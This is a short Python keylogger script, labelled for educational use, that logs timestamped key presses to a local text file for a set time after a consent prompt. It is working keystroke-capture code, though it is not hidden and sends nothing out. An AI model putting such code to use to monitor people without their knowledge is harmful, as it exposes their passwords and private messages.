from pynput import keyboard
import time
import os
import sys

log_file = "keys_log.txt"

def on_key_press(key):
    """Logs each key press with timestamp."""
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        entry = f"{ts} - {key.char}\n"
    except AttributeError:
        entry = f"{ts} - {key}\n"

    with open(log_file, "a") as f:
        f.write(entry)

print("=== Keylogger (Educational Use Only) ===")
print("Use this only on systems you own or have permission to monitor.")
consent = input("Do you agree? (y/n): ").strip().lower()

if consent != "y":
    print("Exiting...")
    sys.exit()

try:
    duration = int(input("Log duration in seconds: "))
except ValueError:
    print("Invalid input.")
    sys.exit()

listener = keyboard.Listener(on_press=on_key_press)
listener.start()

time.sleep(duration)
listener.stop()

print(f"Keystrokes saved in: {os.path.abspath(log_file)}")
